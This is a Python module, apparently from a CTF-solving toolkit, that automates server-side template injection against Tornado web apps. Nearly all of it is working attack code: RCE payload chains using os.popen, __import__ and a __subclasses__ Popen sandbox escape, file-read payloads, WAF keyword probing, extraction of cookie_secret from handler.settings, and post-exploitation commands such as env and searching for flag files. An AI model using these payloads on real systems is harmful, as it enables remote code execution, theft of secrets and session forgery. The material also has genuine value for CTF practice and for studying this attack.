"""
CTF 解题工具 — Tornado 引擎模块
用途: 面向 CTF 竞赛的 Tornado (Python) SSTI 自动化解题辅助
场景: 竞赛平台题目 / 授权测试靶场

特点:
  - Tornado 模板语法与 Jinja2 类似但更简单: {{ }} 和 {% %}
  - handler.settings 可泄露 cookie_secret（常见考点）
  - RCE 路径与 Jinja2 类似: __subclasses__ 沙箱逃逸或直接 __import__
  - 无 Jinja2 的 |attr 过滤器、lipsum/cycler 等全局函数
  - 关键差异: Tornado 用 self 渲染, handler 对象暴露在模板上下文中
"""

from .base import BaseEngine
from .utils import is_waf_blocked


BYPASS_STRATEGIES = [
    {
        'name': '无过滤（__import__ 链）',
        'filters': set(),
        'rce': '{% import os %}{{ os.popen("CMD").read() }}',
        'file_read': '{{ open("FILEPATH").read() }}',
    },
    {
        'name': '过滤 import 关键字（__subclasses__ 沙箱逃逸）',
        'filters': {'keyword'},
        'rce': 'tornado_subclass_bypass',
        'file_read': None,
    },
]


class TornadoEngine(BaseEngine):
    """Tornado (Python) SSTI 引擎"""

    name = 'tornado'
    template_tags = ('{{', '}}', '{%', '%}')
    error_keywords = [
        'NameError', 'TypeError', 'AttributeError',
        'ZeroDivisionError', 'Internal Server Error',
        'Traceback', 'tornado.web', 'not defined',
    ]

    detect_payloads = [
        {'payload': '{{7*7}}', 'expected': '49', 'engines': ['tornado']},
    ]

    fingerprints = [
        {"payload": "{{handler.settings}}", "expected": "cookie_secret", "desc": "Tornado handler.settings 泄露"},
        {"payload": "{{handler.application.settings}}", "expected": "", "desc": "Tornado 应用设置"},
    ]

    rce_chains = [
        # Tornado 原生 {% import %} 指令
        '{% import os %}{{ os.popen("CMD").read() }}',
        # Python 原生表达式（Tornado 无沙箱限制）
        '{{ __import__("os").popen("CMD").read() }}',
        # 通过 handler 对象
        '{{ handler.application.settings["__import__"]("os").popen("CMD").read() }}',
    ]

    file_read_chains = [
        '{{ open("FILEPATH").read() }}',
        '{% import builtins %}{{ builtins.open("FILEPATH").read() }}',
    ]

    bypass_strategies = BYPASS_STRATEGIES

    def probe_waf(self, toolkit):
        """Tornado WAF 探测"""
        filters = set()
        filtered_keywords = set()

        t = toolkit.send_and_clean('{{7*7}}')
        if '49' not in t:
            return filters, filtered_keywords

        # 空格
        t = toolkit.send_and_clean('{{7 * 7}}')
        if '49' not in t:
            filters.add('space')

        # 关键字探测
        test_cases = [
            ('import', '{% import os %}{{ os }}'),
            ('os', '{{ handler.application.settings }}'),
            ('open', '{{ open }}'),
            ('__import__', '{{ __import__ }}'),
            ('handler', '{{ handler }}'),
            ('subclasses', "{{ ''.__class__.__mro__[1].__subclasses__() }}"),
        ]

        for kw, payload in test_cases:
            t = toolkit.send_and_clean(payload)
            if is_waf_blocked(t):
                filtered_keywords.add(kw)
                filters.add('keyword')

        # handler.settings 泄露检查
        t = toolkit.send_and_clean('{{handler.settings}}')
        if not is_waf_blocked(t) and t and 'cookie' in t.lower():
            print("  [+] handler.settings 可读 — cookie_secret 可能泄露")

        self.waf_filters = filters
        self.filtered_keywords = filtered_keywords
        return filters, filtered_keywords

    def build_rce_payload(self, cmd, toolkit=None):
        """Tornado RCE payload 构造"""
        strategy = getattr(toolkit, 'working_bypass', None) if toolkit else None

        if strategy and strategy['rce'] == 'tornado_subclass_bypass':
            # __import__ 被过滤时，用 __subclasses__ 沙箱逃逸
            if '__import__' not in self.filtered_keywords:
                return f'{{{{ __import__("os").popen("{cmd}").read() }}}}', None
            # 用 __subclasses__ 找到 os 模块或 subprocess
            payload = (
                "{% for c in ''.__class__.__mro__[1].__subclasses__() %}"
                "{% if 'Popen' in c.__name__ %}"
                "{{ c(['CMD']).communicate()[0].decode() }}"
                "{% endif %}"
                "{% endfor %}"
            )
            return payload.replace('CMD', cmd), None

        if strategy and isinstance(strategy['rce'], str) and 'CMD' in strategy['rce']:
            return strategy['rce'].replace('CMD', cmd), None

        for chain in self.rce_chains:
            return chain.replace('CMD', cmd), None
        return None, None

    def build_file_payload(self, filepath, toolkit=None):
        """Tornado 文件读取 payload"""
        strategy = getattr(toolkit, 'working_bypass', None) if toolkit else None
        if strategy and strategy.get('file_read') and 'FILEPATH' in str(strategy['file_read']):
            return strategy['file_read'].replace('FILEPATH', filepath), None

        for chain in self.file_read_chains:
            return chain.replace('FILEPATH', filepath), None
        return None, None

    def is_rce_output(self, text, cmd, toolkit=None):
        if not text or len(text) < 2:
            return False
        if is_waf_blocked(text):
            return False
        if '{{' in text or '{%' in text:
            return False
        for kw in self.error_keywords:
            if kw in text:
                return False
        if cmd == 'id':
            return 'uid=' in text or 'gid=' in text
        if toolkit:
            baseline = toolkit._get_baseline()
            if baseline and baseline == text.strip():
                return False
        return len(text) > 0

    def info_gathering(self, toolkit):
        """Tornado 信息收集"""
        print("\n" + "=" * 60)
        print("[*] 信息收集 (Tornado)")
        print("=" * 60)

        # handler.settings 泄露（Tornado 经典考点）
        print("\n  [1] handler.settings:")
        text = toolkit.send_and_clean('{{handler.settings}}')
        if text and not is_waf_blocked(text) and '{{' not in text:
            print(f"      {text[:500]}")
            # 提取 cookie_secret
            import re
            match = re.search(r"cookie_secret['\"]?\s*[:=]\s*['\"]([^'\"]+)", text)
            if match:
                print(f"      [!!!] cookie_secret: {match.group(1)}")
        else:
            print(f"      [-] handler.settings 不可读")

        print("\n  [2] handler.application:")
        text = toolkit.send_and_clean('{{handler.application}}')
        if text and not is_waf_blocked(text) and '{{' not in text:
            print(f"      {text[:300]}")

        # 通过 RCE 收集
        if toolkit.working_chain:
            print("\n  [3] 系统信息 (通过 RCE):")
            output = toolkit.exec_cmd('id')
            if output:
                print(f"      {output[:300]}")

            print("\n  [4] 寻找 flag 文件:")
            output = toolkit.exec_cmd('find / -name "flag*" -type f 2>/dev/null | head -20')
            if output:
                print(f"      {output[:500]}")
            output = toolkit.exec_cmd('cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null')
            if output:
                print(f"      [+] flag: {output}")

            print("\n  [5] 环境变量:")
            output = toolkit.exec_cmd('env')
            if output:
                print(f"      {output[:500]}")

    def probe_attack_surface(self, toolkit):
        """Tornado 攻击面探测"""
        print("\n  [1] handler.settings 泄露检查:")
        text = toolkit.send_and_clean('{{handler.settings}}')
        if is_waf_blocked(text):
            print(f"      [-] handler.settings 被 WAF 拦截")
        elif text and 'cookie' in text.lower():
            print(f"      [+] handler.settings 可读 (前200字符): {text[:200]}")
        elif text and len(text) > 5:
            print(f"      [+] handler.settings 有输出: {text[:200]}")
        else:
            print(f"      [-] handler.settings 不可读")

        print("\n  [2] 全局对象可用性:")
        global_objs = [
            ('handler', '{{handler}}', 'RequestHandler'),
            ('request', '{{handler.request}}', 'HTTPServerRequest'),
            ('application', '{{handler.application}}', 'Application'),
        ]
        available = []
        for name, payload, expected_fragment in global_objs:
            text = toolkit.send_and_clean(payload)
            if is_waf_blocked(text):
                print(f"      [-] {name}: 被 WAF 拦截")
                continue
            if text and len(text) > 0 and '{{' not in text:
                available.append(name)
                print(f"      [+] {name}: 可用 ({text[:60]})")
            else:
                print(f"      [-] {name}: 不可用")
        print(f"\n  [*] 可用全局对象: {available}")
        return available
